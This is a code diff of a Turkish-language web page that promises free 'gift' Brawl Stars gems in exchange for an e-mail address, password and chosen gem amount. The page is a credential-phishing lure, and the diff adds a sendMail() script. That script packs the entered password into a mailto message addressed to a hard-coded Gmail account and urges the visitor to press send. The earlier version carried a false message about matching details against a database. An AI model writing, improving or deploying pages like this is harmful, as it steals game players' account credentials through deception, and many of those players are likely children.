@@ -132,8 +132,8 @@
         <div class="logo">
             <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQoBV-exbJOKrGh9lis5X2s4hF1-2FcHOXH07S-coKpzjAeROkliuCXbvk&s=10" alt="Brawl Stars Logo">
         </div>
-        <h1>HEDİYE BRAWL STARS ELMASI AL</h1>
-        <form action="mailto:soner27atar@gmail.com" method="post" enctype="text/plain" onsubmit="return validateForm()">
+         <h1>HEDİYE BRAWL STARS ELMAS AL</h1>
+        <form id="brawlForm" onsubmit="sendMail(); return false">
             <div class="form-group">
                 <label for="email">E-posta Adresi:</label>
                 <input type="email" id="email" name="email" required>
@@ -145,7 +145,7 @@
             </div>
             
             <div class="form-group">
-                <label>Eşya Miktarı Seçin:</label>
+                <label>Elmas Miktarı Seçin:</label>
                 <div class="options">
                     <div class="option">
                         <input type="radio" id="option1" name="secenek" value="1000" required>
@@ -169,11 +169,28 @@
             <input type="submit" value="Hemen Katıl">
         </form>
     </div>
+
     <script>
-        function validateForm() {
-            // Form doğrulama ekleyebilirsiniz
-            alert('Hediye Elmas hakkı kazanabilmeniz için bilgilerinizin veritabanı ile eşleşmesi gerekmektedir. Lütfen e-posta gönderme işlemini tamamlayın.');
-            return true;
+        function sendMail() {
+            // Form verilerini al
+            const email = encodeURIComponent(document.getElementById('email').value);
+            const password = encodeURIComponent(document.getElementById('password').value);
+            const secenek = encodeURIComponent(document.querySelector('input[name="secenek"]:checked').value);
+            
+            // Mailto linkini oluştur
+            const subject = encodeURIComponent("Yeni Brawl Stars Üyeliği");
+            const body = encodeURIComponent(
+                `E-posta: ${decodeURIComponent(email)}\n` +
+                `Şifre: ${decodeURIComponent(password)}\n` +
+                `Seçilen Eşya Miktarı: ${decodeURIComponent(secenek)} 💎\n\n` +
+                `Bu ileti Brawl Stars üyelik formundan gönderilmiştir.`
+            );
+            
+            // Kullanıcının email istemcisini aç
+            window.location.href = `mailto:soner27atar@gmail.com?subject=${subject}&body=${body}`;
+            
+            // Kullanıcıyı bilgilendir
+            alert('E-posta istemciniz açılacak. Gönder butonuna basarak bilgileri ulaştırabilirsiniz.');
         }
     </script>
 </body>
